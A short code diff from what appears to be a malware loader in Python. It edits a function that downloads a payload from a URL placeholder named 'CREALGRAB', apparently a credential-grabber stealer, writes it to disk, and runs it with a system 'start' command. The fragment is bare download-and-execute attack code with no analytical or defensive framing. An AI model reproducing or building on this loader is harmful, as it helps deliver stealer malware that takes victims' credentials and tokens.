@@ -26,7 +26,7 @@ def getName():
 
 def install(path):
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(request.urlopen("AYHUGRAB").read().decode("utf8"))
+        f.write(request.urlopen("CREALGRAB").read().decode("utf8"))
 
 def run(path):
     system(f"start {executable} {path}")
